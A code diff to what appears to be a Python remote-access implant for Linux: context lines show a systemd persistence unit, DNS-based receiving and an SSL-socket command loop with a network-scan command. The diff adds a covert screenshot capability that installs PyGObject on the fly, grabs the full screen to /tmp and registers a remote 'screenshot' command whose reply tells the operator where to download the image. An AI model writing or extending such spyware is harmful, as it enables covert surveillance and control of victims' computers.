@@ -27,6 +27,27 @@ WantedBy=default.target
 """
 
 
+''' SCREENSHOT '''
+
+
+def take_screenshot() -> bool:
+    try:
+        # Install external module
+        subprocess.check_output("pip install PyGObject".split(" "))
+        import gi
+        gi.require_version('Gdk', '3.0')
+        from gi.repository import Gdk
+        # Capture de l'écran sous Linux
+        window = Gdk.get_default_root_window()
+        x, y, width, height = window.get_geometry()
+        pb = Gdk.pixbuf_get_from_window(window, x, y, width, height)
+        pb.savev("/tmp/screenshot.png", "png", (), ())
+        print("Took screenshot")
+    except:
+        return False
+    return True
+
+
 ''' DNS RECEIVE '''
 
 
@@ -528,6 +549,11 @@ def process_instructions(ss: ssl.SSLSocket, persistence: dict):
                     # Start a network scan
                     output = start_network_scan(buffer.split(b" ")[1].decode())
                     ss.send(output.encode())
+                case b"screenshot":
+                    if take_screenshot():
+                        ss.send(b"Saved screenshot, download '/tmp/screenshot.png' to get result.")
+                    else:
+                        ss.send(b"Failed to get external module or taking screenshot !")
                 case _:
                     print(f"Unknown command received: '{buffer.decode()}'")
                     ss.send(b"unknown")
